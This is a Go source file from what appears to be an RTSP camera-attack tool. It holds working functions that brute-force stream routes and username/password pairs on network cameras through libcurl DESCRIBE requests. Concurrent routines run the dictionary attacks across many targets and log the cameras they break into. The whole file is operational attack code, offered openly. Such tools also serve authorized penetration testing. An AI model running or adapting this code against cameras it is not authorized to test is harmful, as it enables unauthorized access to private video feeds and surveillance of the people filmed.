// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cmrdr

import (
	"fmt"
	"log"
	"time"

	curl "github.com/andelf/go-curl"
	"github.com/pkg/errors"
	v "gopkg.in/go-playground/validator.v9"
)

// TODO: Rename this func
func routeAttack(camera Stream, route string, timeout time.Duration) (Stream, error) {
	easy := curl.EasyInit()
	defer easy.Cleanup()

	if easy != nil {
		attackURL := fmt.Sprintf("rtsp://%s:%s@%s:%d/%s", camera.username, camera.password, camera.address, camera.port, route)

		// Do not send a body in the describe request
		easy.Setopt(curl.OPT_NOBODY, 1)
		// Send a request to the URL of the camera we want to attack
		easy.Setopt(curl.OPT_URL, attackURL)
		// Set the RTSP STREAM URI as the camera URL
		easy.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
		// 2 is CURL_RTSPREQ_DESCRIBE
		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)
		// Set custom timeout
		easy.Setopt(curl.OPT_TIMEOUT, int(timeout/time.Second))

		// Perform the request
		easy.Perform()

		// Get return code for the request
		rc, err := easy.Getinfo(curl.INFO_RESPONSE_CODE)
		if err != nil {
			log.Print(err.Error())
			return camera, err
		}

		// If it's a 404, it means that the route was not valid
		if rc == 404 {
			return camera, errors.New("invalid route")
		}

		camera.route = route
		return camera, nil
	}
	return camera, errors.New("curl initialization error")
}

// TODO: Rename this func
func credAttack(camera Stream, username string, password string, timeout time.Duration) (Stream, error) {
	easy := curl.EasyInit()
	defer easy.Cleanup()

	if easy != nil {
		attackURL := fmt.Sprintf("rtsp://%s:%s@%s:%d/%s", username, password, camera.address, camera.port, camera.route)

		// TODO: Make this readable
		// Prepare cURL DESCRIBE call

		// Do not send a body in the describe request
		easy.Setopt(curl.OPT_NOBODY, 1)
		// Send a request to the URL of the camera we want to attack
		easy.Setopt(curl.OPT_URL, attackURL)
		// Set the RTSP STREAM URI as the camera URL
		easy.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
		// 2 is CURL_RTSPREQ_DESCRIBE
		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)
		// Set custom timeout
		easy.Setopt(curl.OPT_TIMEOUT, int(timeout/time.Second))

		// Perform the request
		easy.Perform()

		// Get return code for the request
		rc, err := easy.Getinfo(curl.INFO_RESPONSE_CODE)
		if err != nil {
			log.Print(err.Error())
			return camera, err
		}

		// If it's a 403 or a 401, it means that the credentials are not correct
		if rc == 403 || rc == 401 {
			return camera, errors.New("invalid credentials")
		}

		camera.username = username
		camera.password = password
		return camera, nil
	}
	return camera, errors.New("curl initialization error")
}

// TODO: Rename this func
func attackCameraCredentials(target Stream, credentials Credentials, resultsChan chan<- Attack) {
	for _, username := range credentials.Usernames {
		for _, password := range credentials.Passwords {
			result, err := credAttack(target, username, password, 1*time.Second)
			if err == nil {
				resultsChan <- Attack{
					stream:           result,
					credentialsFound: true,
					routeFound:       true,
				}
				return
			}
		}
	}
	resultsChan <- Attack{
		stream:           target,
		credentialsFound: false,
	}
}

// TODO: Rename this func
func attackCameraRoute(target Stream, routes Routes, resultsChan chan<- Attack) {
	for _, route := range routes {
		result, err := routeAttack(target, route, 1*time.Second)
		if err == nil {
			resultsChan <- Attack{
				stream:           result,
				credentialsFound: true,
				routeFound:       true,
			}
			return
		}
	}
	resultsChan <- Attack{
		stream:     target,
		routeFound: false,
	}
}

// AttackCredentials attempts to guess the provided targets' credentials using the given
// dictionary or the default dictionary if none was provided by the user
func AttackCredentials(targets []Stream, credentials Credentials) (results []Stream, err error) {
	attacks := make(chan Attack)
	defer close(attacks)

	validate := v.New()
	for _, target := range targets {
		err := validate.Struct(target)
		if err != nil {
			return targets, errors.Wrap(err, "invalid streams")
		}

		go attackCameraCredentials(target, credentials, attacks)
	}

	attackResults := []Attack{}
	for idx := range targets {
		attackResults = append(attackResults, <-attacks)
		fmt.Printf("%d>", idx)
	}

	for _, result := range attackResults {
		if result.credentialsFound == true {
			targets = replace(targets, result.stream)
			log.Printf("Stream attacked successfully: %v", result.stream)
		} else {
			log.Printf("Stream attack failed: %v", result.stream)
		}
	}

	return targets, nil
}

// AttackRoute attempts to guess the provided targets' streaming routes using the given
// dictionary or the default dictionary if none was provided by the user
func AttackRoute(targets []Stream, routes Routes) (results []Stream, err error) {
	attacks := make(chan Attack)
	defer close(attacks)

	validate := v.New()
	for _, target := range targets {
		err := validate.Struct(target)
		if err != nil {
			return targets, errors.Wrap(err, "invalid streams")
		}

		go attackCameraRoute(target, routes, attacks)
	}

	attackResults := []Attack{}
	for idx := range targets {
		attackResults = append(attackResults, <-attacks)
		fmt.Printf("%d>", idx)
	}

	for _, result := range attackResults {
		if result.routeFound == true {
			targets = replace(targets, result.stream)
			log.Printf("Stream attacked successfully: %v", result.stream)
		} else {
			log.Printf("Stream attack failed: %v", result.stream)
		}
	}

	return targets, nil
}
